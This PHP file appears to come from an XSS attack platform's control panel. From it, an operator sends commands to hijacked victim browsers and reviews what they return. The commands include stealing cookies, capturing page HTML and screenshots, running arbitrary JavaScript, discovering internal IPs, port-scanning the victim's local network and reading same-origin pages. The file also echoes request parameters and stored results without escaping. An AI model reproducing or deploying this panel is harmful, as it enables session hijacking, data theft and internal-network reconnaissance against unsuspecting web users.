<?php

/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.19 22:22
 */
header("Content-type: text/html; charset=utf-8");
require_once '../config/mysql_conn.php';
require_once '../config/session.php';
$ip=$_GET['ip'];
$domain=$_GET['domain'];
$safeip = htmlspecialchars(addslashes($_GET['ip']));
$safedomain = htmlspecialchars(addslashes($_GET['domain']));

if($ip && $ip!='' && $domain && $domain!='')
{
   $eval_query= mysql_query("SELECT * FROM `pxss_cmd` WHERE `domain`='{$safedomain}' AND `ip`='{$safeip}'  ORDER BY `datetime` DESC");
   
    echo <<<EOD
    	<div class="panel collapse" minH="100" defH="90">
		<h1>发送命令 <a id="tips" style="visibility: hidden;color:red;"></a></h1>
		<div>
	<form method="post" action="other_tools.php" class="pageForm required-validate" onsubmit="return validateCallback(this, dialogAjaxDone)">
            <input type="hidden" name="domain" value="{$domain}">
            <input type="hidden" name="ip" value="{$ip}">
           
	<select class="combox" name="cmd" id="cmd" onchange="select()">
		<option value="getcookie">GETCOOKIE</option>
		<option value="gethtml">GETHTML</option>
        <option value="pic">截屏</option>
		<option value="alert">ALERT弹窗</option>
        <option value="eval">执行自定义JS</option>
        <option value="getnetworkip">获取内网IP</option>
        <option value="portscan">端口扫描</option>
        <option value="geturlhtml">获取指定网页源码</option>
	</select>
           
            <button type="submit" name="gethtml"  >发送命令</button>
             <input type="text" name="alert" id="alert"  style="visibility: hidden;width:500px;"></br>
                           <input type="text" name="ipaddress" id="ipaddress"  style="visibility: hidden;width:100px;" value="127.0.0.1"> 
              <input type="text" name="ipport" id="ipport"  style="visibility: hidden;width:200px;" value="80,8080,3306">
             	<textarea name="eval" id="eval" style="width:95%;height:50px;visibility: hidden;"></textarea>

             
     </form>

		</div>
	</div>
    
EOD;
}

?>
	<div class="panel collapse" minH="100" defH="150">
		<h1>发送命令记录</h1>
		<div>
	<table class="table" width="100%" layoutH="260" rel="jbsxBox">
		<thead>
			<tr>
				
				<th width="130" orderField="data" class="asc">时间</th>
				<th width="100">命令</th>
				<th width="100">内容</th>
				<th orderField="res">返回结果</th>

			</tr>
		</thead>
		<tbody>
<?php
while(is_array( $eval_res=mysql_fetch_array($eval_query)))
{
   $cmd=$eval_res['cmd'];
   $cmd_con='';
   
   switch($cmd){
    case 1:$cmd_con='获取cookie';break;
    case 2:$cmd_con='获取源码';break;
    case 3:$cmd_con='弹窗';break;
    case 4:$cmd_con='自定义JS';break;
    case 5:$cmd_con='截屏';break;
    case 6:$cmd_con='获取内网IP';break;
    case 7:$cmd_con='端口扫描';break;
    case 8:$cmd_con='获取指定网页源码';break;
   }


?>
            
			<tr target="sid_obj" rel="1" onclick="res(<?=$eval_res['id']?>)">
				<td><?=$eval_res['datetime']?></td>
				<td><?=$cmd_con?></td>
				<td><?=$eval_res['connect']?></td>
				<td id="<?=$eval_res['id']?>"><?=$eval_res['res']?></td>

			</tr>
	

    <?php }?>

    		</tbody>

	</table>		</div>
	</div>

    	<div class="panel close collapse" defH="130">
		<h1>返回结果</h1>
		<div>
 <textarea id="textres" style="width:99.5%;height:100px">
返回结果
</textarea>
		</div>
	</div>
<script>
function res(id)
{
    var textarea=document.getElementById("textres");
    var resres=document.getElementById(id);
    textarea.innerHTML =resres.innerHTML.substring(5,resres.innerHTML.length-6);
}
function select()
{
    var selectpro=document.getElementById("cmd");
    var alert=document.getElementById("alert");
    var eval=document.getElementById("eval");
    var ipaddress=document.getElementById("ipaddress");
    var ipport=document.getElementById("ipport");
    var a=document.getElementById("tips")
    if(selectpro.options[selectpro.selectedIndex].value=="alert")
    {
        alert.style.visibility="visible";
    }else if(selectpro.options[selectpro.selectedIndex].value!="geturlhtml"){
        alert.style.visibility="hidden";
        alert.value ='';
    }
       if(selectpro.options[selectpro.selectedIndex].value=="eval")
    {
        eval.style.visibility="visible";
    }else{
        eval.style.visibility="hidden";
        eval.value='';
    }
    if(selectpro.options[selectpro.selectedIndex].value=="portscan")
    {
        ipaddress.value='127.0.0.1';
        ipport.value='80,8080,3306';
        ipaddress.style.visibility="visible";
        ipport.style.visibility="visible";
        a.innerHTML=" 提示：只支持单IP扫描,结果有误报,仅供参考(IE下准确率较高)";
        a.style.visibility="visible";
    }else{
       ipaddress.style.visibility="hidden";
        ipport.style.visibility="hidden";
        a.style.visibility="hidden"; 
        ipaddress.value='';
        ipport.value='';
    }
    if(selectpro.options[selectpro.selectedIndex].value=="geturlhtml")
    {
        
         a.innerHTML=" 只能获取同域下的网页源码,不支持跨域";
        a.style.visibility="visible";
        alert.style.visibility="visible";
    }else if(selectpro.options[selectpro.selectedIndex].value!="alert"){
        alert.style.visibility="hidden";
        alert.value ='';
    }
}

</script>
